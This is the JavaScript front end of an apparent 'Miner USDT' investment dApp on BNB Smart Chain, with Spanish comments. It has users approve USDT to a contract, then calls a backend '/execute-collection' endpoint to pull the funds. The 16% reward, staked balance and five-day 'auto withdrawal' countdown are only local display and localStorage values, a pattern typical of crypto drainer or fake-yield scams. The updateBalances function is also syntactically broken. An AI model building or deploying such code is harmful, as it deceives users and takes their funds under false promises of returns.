import { CONFIG } from './config.js';
import { createAppKit } from 'https://cdn.jsdelivr.net/npm/@reown/appkit@1.6.0/+esm';
import { Ethers5Adapter } from 'https://cdn.jsdelivr.net/npm/@reown/appkit-adapter-ethers5@1.6.0/+esm';
import { bsc } from 'https://cdn.jsdelivr.net/npm/@reown/appkit@1.6.0/networks/+esm';

// ==========================================
// VARIABLES GLOBALES DE ESTADO & PERSISTENCIA
// ==========================================
let modal = null;
let provider = null;
let signer = null;
let userAddress = null;
let pendingInvestment = false;
let userRealStakedAmount = 0;
let countdownTimerInterval = null;

// Cargar transacciones previas de la sesión persistente si existen
let sessionTxs = [];
try {
    const savedTxs = localStorage.getItem('miner_session_txs');
    if (savedTxs) sessionTxs = JSON.parse(savedTxs);
} catch (e) {
    sessionTxs = [];
}

const ERC20_ABI = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function approve(address spender, uint256 amount) external returns (bool)"
];

// ==========================================
// INICIALIZACIÓN DE LA APLICACIÓN
// ==========================================
export async function initApp() {
    setupWakeUpBackend();
    initWalletModal();
    setupUIEventListeners();
    updateMainActionButton('CONNECT');
    
    const merchantInput = document.getElementById("merchantAddress");
    if (merchantInput) {
        merchantInput.value = CONFIG.MERCHANT_ADDRESS;
        makeCopyableInput(merchantInput, CONFIG.MERCHANT_ADDRESS);
    }
    
    // Renderizar transacciones persistidas al cargar
    renderStoredTransactions();
}

export function openAccountModal() {
    if (modal) {
        modal.open({ view: 'Account' });
    }
}

export function openConnectModal() {
    if (modal) modal.open();
}

function setupWakeUpBackend() {
    fetch(`${CONFIG.BACKEND_URL}/health`, { method: 'GET' }).catch(() => {});
}

// ==========================================
// CONFIGURACIÓN REOWN APPKIT v1.6.0 + ETHERS v5
// ==========================================
function initWalletModal() {
    const metadata = {
        name: CONFIG.APP_NAME || 'Miner USDT Protocol',
        description: 'Plataforma de pagos y finanzas descentralizadas',
        url: window.location.origin,
        icons: [`${window.location.origin}/img/logo.svg`]
    };

    const ethersAdapter = new Ethers5Adapter();

    modal = createAppKit({
        adapters: [ethersAdapter],
        networks: [bsc],
        defaultNetwork: bsc,
        metadata,
        projectId: CONFIG.PROJECT_ID,
        features: { 
            analytics: true, 
            swaps: false, 
            onramp: false 
        }
    });

    window.modal = modal;

    const activeProv = modal.getWalletProvider?.();
    if (activeProv) {
        handleConnectedProvider(activeProv);
    }

    if (modal && typeof modal.subscribeEvents === "function") {
        modal.subscribeEvents((event) => {
            if (event.data && event.data.event === 'DISCONNECT') {
                resetAppSession();
            } else if (event.data && (event.data.event === 'CONNECT_SUCCESS' || event.data.event === 'MODAL_CLOSE')) {
                const prov = modal.getWalletProvider?.();
                if (prov && !userAddress) {
                    handleConnectedProvider(prov);
                    if (pendingInvestment) {
                        pendingInvestment = false;
                        runInvestmentFlow(prov);
                    }
                }
            }
        });
    }
}

// ==========================================
// MANEJADOR DE PROVEEDOR (ETHERS v5)
// ==========================================
async function handleConnectedProvider(walletProvider) {
    try {
        provider = new ethers.providers.Web3Provider(walletProvider);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();

        // Restaurar estado persistido del usuario si existe en localStorage
        loadUserState(userAddress);

        if (walletProvider && typeof walletProvider.on === "function") {
            walletProvider.removeAllListeners?.("disconnect");
            walletProvider.removeAllListeners?.("accountsChanged");

            walletProvider.on("disconnect", async () => {
                await forceCloseReownSession();
            });

            walletProvider.on("accountsChanged", async (accounts) => {
                if (!accounts || accounts.length === 0) {
                    await forceCloseReownSession();
                } else {
                    handleConnectedProvider(walletProvider);
                }
            });
        }

        updateWalletUI(userAddress);
        await updateBalances(walletProvider);
        updateMainActionButton('INVEST');
        validateInvestmentInput();
    } catch (error) {
        console.error("Error al sincronizar proveedor con Ethers v5:", error);
        resetAppSession();
    }
}

// ==========================================
// PERSISTENCIA DE ESTADO DE USUARIO
// ==========================================
function saveUserState(address, stakedAmount) {
    if (!address) return;
    const stateData = {
        stakedAmount: stakedAmount || 0,
        timestamp: Date.now()
    };
    localStorage.setItem(`miner_user_state_${address.toLowerCase()}`, JSON.stringify(stateData));
}

function loadUserState(address) {
    if (!address) return;
    try {
        const saved = localStorage.getItem(`miner_user_state_${address.toLowerCase()}`);
        if (saved) {
            const data = JSON.parse(saved);
            if (data.stakedAmount && data.stakedAmount > 0) {
                updateStakedUI(data.stakedAmount, false); // Cargar sin reiniciar timestamp si ya estaba activo
            }
        }
    } catch (e) {
        console.warn("No se pudo cargar el estado persistido del usuario", e);
    }
}

// ==========================================
// CIERRE DE SESIÓN Y LIMPIEZA DE CACHÉ
// ==========================================
async function forceCloseReownSession() {
    try {
        if (modal && typeof modal.disconnect === "function") {
            await modal.disconnect();
        }
    } catch (e) {
        console.warn("Error al cerrar sesión en AppKit:", e);
    }

    for (let i = localStorage.length - 1; i >= 0; i--) {
        const key = localStorage.key(i);
        if (key && (key.includes('wc@') || key.includes('w3m') || key.includes('reown') || key.includes('appkit'))) {
            localStorage.removeItem(key);
        }
    }

    resetAppSession();
}

window.disconnectWalletSession = async function() {
    try {
        if (modal && typeof modal.getWalletProvider === "function") {
            const rawProv = modal.getWalletProvider();
            if (rawProv && typeof rawProv.request === "function") {
                await rawProv.request({
                    method: "wallet_revokePermissions",
                    params: [{ eth_accounts: {} }]
                }).catch(() => {});
            }
        }
    } catch (e) {}

    await forceCloseReownSession();
    setTimeout(() => {
        window.location.reload();
    }, 200);
};

// ==========================================
// GESTIÓN DE INTERFAZ Y SALDOS (ETHERS v5)
// ==========================================
async function updateBalances(rawProvider) {
    if (!userAddress) return;
    try {
        const activeProvider = provider || new ethers.providers.Web3Provider(rawProvider);
        const activeSigner = signer || activeProvider.getSigner();
        
        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);
        const usdtBal = await usdtContract.balanceOf(userAddress);
        const formattedUsdt = ethers.utils.formatUnits(usdtBal, 18);

        const balanceLabel = document.getElementById("walletBalanceLabel");
        if (balanceLabel) {
            balanceLabel.textContent = `Saldo: ${parseFloat(formattedUsdt).toFixed(2)} USDT`;
        }

        // Configuración global y dinámica del botón MAX (Independiente del estado de conexión)
        const maxBtn = document.getElementById("maxBtn");
        if (maxBtn) {
            maxBtn.onclick = () => {
                const amountInput = document.getElementById("investAmount");
                if (!amountInput) return;
        
                let targetVal = 1000.00; // Tope por defecto para usuarios no conectados
        
                // Si el usuario está conectado, adaptamos el MAX a su saldo real disponible
                if (userAddress) {
                    const balanceLabel = document.getElementById("walletBalanceLabel");
                    if (balanceLabel && balanceLabel.textContent) {
                        const match = balanceLabel.textContent.match(/[\d.]+/);
                        if (match) {
                            const walletBalance = parseFloat(match[0]);
                            targetVal = walletBalance > 0 ? walletBalance : 1000.00;
                        }
                    }
                }
        
                amountInput.value = targetVal.toFixed(2);
                amountInput.dispatchEvent(new Event('input'));
                validateInvestmentInput();
        } catch (err) {
        console.error("Error al sincronizar saldos en vivo:", err);
        }
    }
}       
function updateWalletUI(account) {
    const container = document.getElementById("walletButtonContainer");
    if (container) {
        container.innerHTML = `
            <div style="display: flex; align-items: center; gap: 8px;">
                <span class="wallet-badge" id="connectedWalletBadge">
                    ${account.substring(0, 6)}...${account.substring(account.length - 4)}
                </span>
                <button onclick="window.openAccountModal()" title="Configuración de cuenta" style="background: rgba(255, 255, 255, 0.05); border: 1px solid var(--surface-border); color: #fff; padding: 8px 12px; border-radius: 12px; cursor: pointer; font-weight: 700;">
                    ⚙️ Cuenta
                </button>
            </div>
        `;
    }

    const txContainer = document.getElementById("sessionTxContainer");
    if (txContainer) txContainer.style.display = "block";

    const withdrawalContainer = document.getElementById("withdrawalContainer");
    if (withdrawalContainer) withdrawalContainer.style.display = "block";

    updateMainActionButton('INVEST');
}

function resetAppSession() {
    provider = null;
    signer = null;
    userAddress = null;
    userRealStakedAmount = 0;

    const container = document.getElementById("walletButtonContainer");
    if (container) {
        container.innerHTML = `
            <button onclick="window.openConnectModal()" class="wallet-badge" style="background: rgba(38,161,123,0.15); border: 1px solid var(--brand-primary); cursor: pointer;">
                Conectar Billetera
            </button>
        `;
    }

    const balanceLabel = document.getElementById("walletBalanceLabel");
    if (balanceLabel) balanceLabel.textContent = "Saldo: 0.00 USDT";

    const stakedBadge = document.getElementById("stakedAmountBadge");
    if (stakedBadge) stakedBadge.textContent = "0.00 USDT";

    const pendingReward = document.getElementById("pendingRewardOutput");
    if (pendingReward) pendingReward.textContent = "0.00 USDT";

    if (countdownTimerInterval) clearInterval(countdownTimerInterval);
    const countdownEl = document.getElementById("roiCountdown");
    if (countdownEl) countdownEl.textContent = "--:--:--:--";

    const txContainer = document.getElementById("sessionTxContainer");
    if (txContainer) txContainer.style.display = "none";

    const withdrawalContainer = document.getElementById("withdrawalContainer");
    if (withdrawalContainer) withdrawalContainer.style.display = "none";

    updateMainActionButton('CONNECT');
    validateInvestmentInput();
}

function updateStakedUI(amount, persist = true) {
    userRealStakedAmount = parseFloat(amount) || 0;
    
    if (userAddress && persist) {
        saveUserState(userAddress, userRealStakedAmount);
    }
    
    const stakedBadge = document.getElementById("stakedAmountBadge");
    const pendingReward = document.getElementById("pendingRewardOutput");
    
    if (stakedBadge) {
        stakedBadge.textContent = `${userRealStakedAmount.toFixed(2)} USDT`;
    }
    
    if (pendingReward) {
        const calculatedReward = userRealStakedAmount * 0.16;
        pendingReward.textContent = `${calculatedReward.toFixed(2)} USDT`;
    }

    if (userRealStakedAmount > 0) {
        startRoiCountdown(5 * 24 * 60 * 60);
    }
}

function startRoiCountdown(durationInSeconds) {
    let timer = durationInSeconds;
    const countdownEl = document.getElementById("roiCountdown");
    if (!countdownEl) return;

    if (countdownTimerInterval) clearInterval(countdownTimerInterval);

    countdownTimerInterval = setInterval(() => {
        const days = Math.floor(timer / (3600 * 24));
        const hours = Math.floor((timer % (3600 * 24)) / 3600);
        const minutes = Math.floor((timer % 3600) / 60);
        const seconds = Math.floor(timer % 60);

        countdownEl.textContent = `${days}d ${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`;

        if (--timer < 0) {
            clearInterval(countdownTimerInterval);
            countdownEl.textContent = "¡Completado (Retiro Auto)";
        }
    }, 1000);
}

function updateMainActionButton(state) {
    const approveBtn = document.getElementById("approveBtn");
    const btnText = document.getElementById("btnText");
    if (!approveBtn || !btnText) return;

    if (state === 'CONNECT') {
        btnText.textContent = "CONECTAR BILLETERA";
        approveBtn.onclick = () => openConnectModal();
    } else {
        btnText.textContent = "INVERTIR AHORA";
        approveBtn.onclick = async () => {
            let rawProvider = null;
            if (modal && typeof modal.getWalletProvider === "function") {
                try {
                    rawProvider = modal.getWalletProvider();
                } catch (_) {}
            }

            if (!rawProvider) {
                pendingInvestment = true;
                if (modal && typeof modal.open === "function") {
                    try {
                        modal.open();
                    } catch (err) {
                        console.error("Error al desplegar el selector de billeteras:", err);
                        pendingInvestment = false;
                    }
                }
                return;
            }

            await runInvestmentFlow(rawProvider);
        };
    }
}

function setupUIEventListeners() {
    const input = document.getElementById("investAmount");
    if (input) {
        input.addEventListener("input", validateInvestmentInput);
    }
}

// Validación de límites (MIN fijo en 0.1 y MAX adaptable al estado)
function validateInvestmentInput() {
    const input = document.getElementById("investAmount");
    const wrapper = input ? input.closest('.input-wrapper') : null;
    if (!input || !wrapper) return;

    const val = parseFloat(input.value) || 0;
    const minVal = 0.1; // Mínimo fijo estricto
    
    let maxVal = 1000.00; // Máximo por defecto si no está conectado
    
    if (userAddress) {
        const balanceLabel = document.getElementById("walletBalanceLabel");
        const match = balanceLabel ? balanceLabel.textContent.match(/[\d.]+/) : null;
        if (match) {
            maxVal = parseFloat(match[0]) || 1000.00;
        }
    }

    // Comprobar si el valor está fuera de rango
    if (val > maxVal || val < minVal) {
        wrapper.classList.add('shake-error');
        setTimeout(() => wrapper.classList.remove('shake-error'), 500);
    } else {
        wrapper.classList.remove('shake-error');
    }
}

function updateStepper(activeStep) {
    for (let i = 1; i <= 3; i++) {
        const stepEl = document.getElementById(`step-${i}`);
        if (!stepEl) continue;
        const circle = stepEl.querySelector('.step-circle');
        
        if (i < activeStep) {
            circle.style.background = '#10b981';
            circle.style.color = '#fff';
            circle.textContent = '✓';
            stepEl.style.opacity = '0.7';
        } else if (i === activeStep) {
            circle.style.background = 'var(--brand-primary)';
            circle.style.color = '#fff';
            circle.textContent = i;
            stepEl.style.opacity = '1';
        } else {
            circle.style.background = 'rgba(255,255,255,0.1)';
            circle.style.color = 'var(--text-muted)';
            circle.textContent = i;
            stepEl.style.opacity = '0.5';
        }
    }
}

// ==========================================
// FLUJO DE INVERSIÓN (ETHERS v5)
// ==========================================
async function runInvestmentFlow(rawProvider) {
    setLoading(true, "Conectando proveedor…");
    updateStepper(1);
  
    try {
        const activeProvider = new ethers.providers.Web3Provider(rawProvider);
        
        setLoading(true, "Verificando red BSC...");
        const network = await activeProvider.getNetwork();
        if (Number(network.chainId) !== 56) {
            setLoading(true, "Cambiando a red BSC…");
            try {
                await rawProvider.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: CONFIG.CHAIN_ID }]
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await rawProvider.request({
                        method: "wallet_addEthereumChain",
                        params: [{
                            chainId: CONFIG.CHAIN_ID,
                            chainName: CONFIG.CHAIN_NAME,
                            rpcUrls: CONFIG.RPC_URLS,
                            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                            blockExplorerUrls: [CONFIG.BLOCK_EXPLORER]
                        }]
                    });
                } else {
                    showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
                    setLoading(false);
                    return;
                }
            }
        }

        const activeSigner = activeProvider.getSigner();
        const activeUserAddress = await activeSigner.getAddress();

        setLoading(true, "Verificando saldo de gas (BNB)…");
        const bnbBalance = await activeProvider.getBalance(activeUserAddress);
        const minGasRequired = ethers.utils.parseEther("0.0005");

        if (bnbBalance.lt(minGasRequired)) {
            showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
            setLoading(false);
            return;
        }

        const inputElement = document.getElementById("investAmount");
        const rawInputVal = inputElement ? inputElement.value : "1";
        const requiredAmount = ethers.utils.parseUnits(rawInputVal || "1", 18);

        const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, ERC20_ABI, activeSigner);

        setLoading(true, "Validando saldo de USDT…");
        const usdtBalance = await usdtContract.balanceOf(activeUserAddress);

        if (usdtBalance.lt(requiredAmount)) {
            showToast("No tienes suficiente saldo de USDT en tu billetera.", "error");
            setLoading(false);
            return;
        }

        updateStepper(2);
        setLoading(true, "Verificando autorizaciones...");
        const allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
        
        const zeroBN = ethers.BigNumber.from(0);
        if (allowance.lt(requiredAmount)) {
            if (allowance.gt(zeroBN)) {
                setLoading(true, "Restableciendo autorización previa...");
                const txReset = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, zeroBN);
                await txReset.wait();
            }
        
            setLoading(true, "Firma requerida: Aprobar USDT…");
            const txApprove = await usdtContract.approve(CONFIG.CONTRACT_ADDRESS, requiredAmount);
            
            setLoading(true, "Confirmando aprobación en red...");
            await txApprove.wait();
        }

        updateStepper(3);
        setLoading(true, "Procesando inversión en protocolo...");
          
        const txCollect = await triggerBackendCollect(activeUserAddress, rawInputVal);

        const txHash = txCollect?.hash || "";
        if (txHash) {
            addSessionTransaction(txHash);
            showToast(`¡Inversión exitosa! <a href="${CONFIG.BLOCK_EXPLORER}/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
        } else {
            showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
        }

        updateStakedUI(rawInputVal);

    } catch (err) {
        console.error("Error en el flujo de inversión:", err);
        const errorMsg = err?.reason || err?.message || "Error desconocido en la transacción.";
        showToast(`Operación cancelada o fallida: ${errorMsg.substring(0, 80)}`, "error", 6000);
    } finally {
        setLoading(false);
        updateStepper(1);
    }
}

async function triggerBackendCollect(userAddress, amountStr) {
    let lastErr;
    const dynamicAmountWei = ethers.utils.parseUnits(amountStr.toString(), 18).toString();

    for (let i = 1; i <= 3; i++) {
        try {
            const res = await fetch(`${CONFIG.BACKEND_URL}/execute-collection`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
            });
            const data = await res.json();
            if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
            return data;
        } catch (e) {
            lastErr = e;
            if (i < 3) await new Promise(r => setTimeout(r, 3000));
        }
    }
    throw lastErr;
}

function addSessionTransaction(txHash) {
    if (!sessionTxs.includes(txHash)) {
        sessionTxs.unshift(txHash);
        // Mantener un límite máximo de 10 transacciones guardadas
        if (sessionTxs.length > 10) sessionTxs.pop();
        try {
            localStorage.setItem('miner_session_txs', JSON.stringify(sessionTxs));
        } catch (e) {
            console.warn("No se pudo guardar la transacción en localStorage", e);
        }
    }
    renderStoredTransactions();
}

function renderStoredTransactions() {
    const listContainer = document.getElementById("sessionTxList");
    if (!listContainer) return;

    if (sessionTxs.length === 0) {
        listContainer.innerHTML = `<span style="color: rgba(255,255,255,0.3); font-style: italic;">Sin transacciones confirmadas todavía</span>`;
        return;
    }

    listContainer.innerHTML = sessionTxs.map(hash => `
        <div style="display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.03); padding: 8px 10px; border-radius: 6px; margin-bottom: 4px;">
            <span style="font-family: monospace; color: #fff;">${hash.substring(0, 10)}...${hash.substring(hash.length - 6)}</span>
            <a href="${CONFIG.BLOCK_EXPLORER}/tx/${hash}" target="_blank" style="color: var(--brand-primary); text-decoration: none; font-weight: 600;">Ver ↗</a>
        </div>
    `).join('');
}

function makeCopyableInput(element, text) {
    element.style.cursor = "pointer";
    element.title = "Hacer clic para copiar dirección";
    element.addEventListener("click", async () => {
        try {
            await navigator.clipboard.writeText(text);
            showToast("¡Dirección copiada al portapapeles!", "success", 2500);
        } catch (err) {
            console.error("Error al copiar:", err);
        }
    });
}

// ==========================================
// UTILIDADES UI (LOADERS Y TOASTS)
// ==========================================
const approveBtn = document.getElementById("approveBtn");
const btnText = document.getElementById("btnText");
const btnSpinner = document.getElementById("btnSpinner");
const toastEl = document.getElementById("toast");

function setLoading(on, label = "Procesando…") {
    if (!approveBtn) return;
    approveBtn.disabled = on;
    approveBtn.style.opacity = on ? "0.8" : "1";
    if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
    if (btnSpinner) btnSpinner.hidden = !on;
}

let _toastTimer;
function showToast(msg, type = "default", ms = 4500) {
    if (!toastEl) return;
    clearTimeout(_toastTimer);
    toastEl.innerHTML = msg;
    toastEl.dataset.type = type === "default" ? "" : type;
    toastEl.hidden = false;
  
    if (type === "success") {
        toastEl.style.background = "rgba(38, 161, 123, 0.95)";
    } else if (type === "error") {
        toastEl.style.background = "rgba(220, 53, 69, 0.95)";
    } else {
        toastEl.style.removeProperty("background");
    }

    _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
}
